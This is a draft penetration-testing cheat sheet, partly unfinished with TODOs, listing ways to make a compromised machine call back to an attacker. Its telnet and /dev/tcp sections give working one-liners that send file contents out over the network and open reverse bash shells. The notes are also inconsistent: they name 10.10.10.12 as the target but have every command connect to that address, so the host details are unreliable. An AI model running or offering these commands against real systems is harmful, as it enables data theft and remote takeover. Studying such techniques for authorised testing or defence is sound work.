===================================
 Connecting one machine to another
===================================

TODO: Divide up into windows and linux

Often we need to get data from a target machine, or make use of a communication channel that's a little awkward to get a reverse shell that we can make use of more easily.  Here we will list a number of ways to get a target machine to talk back to you once you have a toehold.

In the sections below, we make constant reference to machines by IP and have to keep explaining which one is remote, which one is local, etc. So, to simplify, all target machines are 10.10.10.12 and the machine you're working from is 10.10.10.1. Mostly the port used will be 8765. So, if you see these magic numbers, this is what they mean. If there's any reason to deviate it will be explained. The assumption is that you have something listening on your machine with `nc -lp 8765` or similar.


Using Netcat
============

TODO: Write a netcat section.  Big enough that it needs it's own?



Using Telnet
============

Although not as useful in many situations as netcat, telnet can be used to exfiltrate or provide a reverse shell.  First, let's steal data::

  cat /some/file.txt | telnet 10.10.10.12 8765

Fairly simple. Now let's get a reverse shell::
    
  mknod mypipe p
  telnet 10.10.10.12 8765 0<mypipe | /bin/bash > mypipe

What's happening?

- Line 1 creates a named pipe called "mypipe" that we can use to push data in and out.  If we were using netcat's `-e` option, all the interaction would be done for us, but we need to do our own plumbing.
  - Line 2 is running telnet and connecting to our open port. The first bit of trickery is `0<mypipe` which connects standard input (channel 0) to the pipe such that things going into the pipe get diverted into telnet.  The second part (`| /bin/bash > mypipe`) pipes the output from telnet into a bash shell, which then has it's own output redirected back into the pipe so that it gets connected telnet's input.

TODO: Write something on pipes. Named and unnamed, redirection, standard channels, etc.  With diagrams.
  
Using /dev/tcp
==============

No netcat?  No telnet?  Here's another option...

You can create simple netcat-like connections like this::

  cat /some/file.txt > /dev/tcp/10.10.10.12/8765

Which pushes the contents of `file.txt` into our waiting netcat session.

And making it a shell using black magic fuckery::

  exec 3<>/dev/tcp/10.10.10.12/8765 && bash <&3 >&3

Or::
    
  bash -i >& /dev/tcp/10.10.10.12/8765 0>&1    

As a HTTP request
=================



